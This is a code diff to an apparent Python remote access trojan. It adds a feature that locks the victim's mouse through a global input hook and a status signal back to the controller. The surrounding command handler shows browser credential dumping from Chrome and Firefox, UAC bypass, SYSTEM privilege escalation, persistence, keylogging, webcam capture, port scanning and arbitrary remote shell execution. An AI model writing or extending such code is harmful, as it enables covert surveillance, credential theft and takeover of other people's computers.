@@ -62,6 +62,9 @@ def windows_only(func):
 		if os.name != "nt": return "Command not available on non-windows OS."
 		else: return func(*args)
 	return tester
+	
+def status(stat):
+	shell.transport.user_channel.signal("STATUS:"+stat)
 
 class StoppableThread(threading.Thread):
 	"""
@@ -525,6 +528,8 @@ class Information_Gathering:
 	"""
 	def __init__(self):
 		self.keylog_thread = None
+		self.mouselock = None
+		self.keylock = None
 		self.key_log = ""
 		
 	@windows_only
@@ -575,6 +580,40 @@ class Information_Gathering:
 		log = self.key_log
 		self.key_log = ""
 		return log
+		
+	@windows_only
+	def lock_mouse(self):
+		def DENIED(event): return False
+		
+		def pumper():
+			ct = threading.currentThread()
+			while not ct.stopped():
+				hook = pyHook.HookManager()
+				hook.MouseAll = DENIED
+				hook.HookMouse()
+				pythoncom.PumpMessages()
+				
+		t = StoppableThread(target=pumper)
+		t.daemon = True
+		t.start()	
+
+		self.mouselock = t
+		
+	def unlock_mouse(self):
+		self.mouselock.stop()
+		win32api.PostThreadMessage(self.mouselock.ident, win32con.WM_QUIT, 0, 0)
+		
+	@windows_only
+	def uictl(self, action, what):
+		if action == "lock":
+			if what == "mouse":
+				self.lock_mouse()
+				
+		elif action == "unlock":
+			if what == "mouse":
+				self.unlock_mouse()
+				
+		return "k"
 		
 	@windows_only
 	def webcam_list(self):
@@ -727,36 +766,49 @@ help - This menu!
 			elif data.startswith("cd"):
 				data = data[3:]
 				output = fs.change_directory(data.strip())
+				
 			elif data == "ls":
 				output = execute.execute_shell_command("dir")[1]
+				
 			elif data == "ps":
 				output = execute.execute_shell_command("tasklist")[1]
+				
 			elif data.startswith("killall"):
 				process = data.split()[1]
 				output = execute.execute_shell_command("taskkill /F /IM "+process+" /T")
+				
 			elif data == "isadmin":
 				output = str(misc.isadmin())
+				
 			elif data == "bypassuac":
 				output = privesc.bypass_uac()
+				
 			elif data == "dumpchrome":
 				output = info.dump_chrome()
+				
 			elif data == "dumpff":
 				output = info.dump_firefox()
+				
 			elif data == "die":
 				os._exit(0)
+				
 			elif data == "getsystem":
 				output = privesc.get_system()
+				
 			elif data.startswith("download"):
 				file = data.split()[1]
 				output = fs.download(file, self.transport)
+				
 			elif data == "persist":
 				output = misc.persist()
+				
 			elif data.startswith("portscan"):
 				try:
 					hosts, ports = data.split()[1], data.split()[2]
 					output = net.portscan(hosts, ports)
 				except Exception as e:
 					output = str(e)+"\nusage: portscan [host_range] [port_range]"
+					
 			elif data.startswith("keylog") or data.startswith("keyscan"):
 				try:
 					arg = data.split()[1]
@@ -769,6 +821,7 @@ help - This menu!
 					output = info.keylog_stop()
 				elif arg == "dump":
 					output = info.keylog_dump()
+					
 			elif data.startswith("webcam"):
 				try:
 					arg = data.split()[1]
@@ -782,9 +835,18 @@ help - This menu!
 					try: num = data.split()[2]
 					except: output = "[*] Usage: webcam [list|snap [id] ]"
 					output = info.webcam_snap(num)
+					
+			elif data.startswith("uictl"):
+				try:
+					action, what = data.split()[1], data.split()[2]
+				except:
+					output = "why"
+				else:
+					output = info.uictl(action, what)
+
 			else:
 				output = execute.execute_shell_command(data)[1]
-				
+
 			if output != "BG_NEW_SESH": self.send(str(output)+"\n"+os.getcwd()+">>")
 		
 	def send(self, data):
